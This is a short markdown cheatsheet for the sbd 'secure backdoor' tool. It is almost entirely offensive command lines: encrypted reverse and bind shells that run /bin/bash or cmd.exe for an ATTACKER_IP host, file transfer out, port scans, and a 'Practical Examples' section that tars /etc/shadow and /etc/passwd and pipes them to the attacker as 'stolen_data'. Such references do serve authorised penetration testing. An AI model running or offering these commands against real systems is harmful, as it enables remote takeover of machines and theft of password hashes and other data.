---
title: "sbd CHEATSHEET"
description: "Quick reference for sbd secure backdoor commands"
---

# sbd CHEATSHEET

## Basic Operations

```bash
sbd -l -p 4444 -k password                   # Listen with encryption
sbd ATTACKER_IP 4444 -k password              # Connect with encryption
sbd -h                                         # Show help
```

## Reverse Shells

```bash
# Listener
sbd -l -p 4444 -k "S3cr3tK3y"

# Target reverse shell
sbd ATTACKER_IP 4444 -k "S3cr3tK3y" -e /bin/bash

# PowerShell reverse shell (Windows)
sbd ATTACKER_IP 4444 -k "S3cr3tK3y" -e cmd.exe
```

## Bind Shells

```bash
# Target
sbd -l -p 4444 -k "S3cr3tK3y" -e /bin/bash

# Attacker
sbd 192.168.1.100 4444 -k "S3cr3tK3y"
```

## File Transfer

```bash
# Send file (encrypted)
sbd -l -p 4444 -k "S3cr3tK3y" > received_file   # Receiver
sbd ATTACKER_IP 4444 -k "S3cr3tK3y" < file.txt    # Sender

# Send with progress
cat file.txt | pv | sbd ATTACKER_IP 4444 -k "S3cr3tK3y"
```

## Port Scanning

```bash
sbd -z -v ATTACKER_IP 1-1000                   # TCP scan
sbd -z -v ATTACKER_IP 80,443,8080              # Specific ports
```

## Key Management

```bash
sbd -k "passphrase" -g                          # Generate key from passphrase
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-p PORT` | Port number |
| `-k KEY` | Pre-shared encryption key |
| `-e CMD` | Execute command on connection |
| `-z` | Zero-I/O (scanning) |
| `-v` | Verbose output |
| `-u` | UDP mode |
| `-d` | Daemon mode (keep listening) |
| `-g` | Generate key from passphrase |
| `-n` | No DNS resolution |

## Practical Examples

```bash
# Secure file exfiltration
sbd -l -p 4444 -k "ExfilKey2024!" > stolen_data.tar.gz    # Attacker
tar czf - /etc/shadow /etc/passwd | sbd ATTACKER_IP 4444 -k "ExfilKey2024!"  # Target

# Encrypted interactive shell
sbd -l -p 4444 -k "ShellKey!@#$"                          # Attacker
sbd ATTACKER_IP 4444 -k "ShellKey!@#$" -e /bin/bash       # Target
```
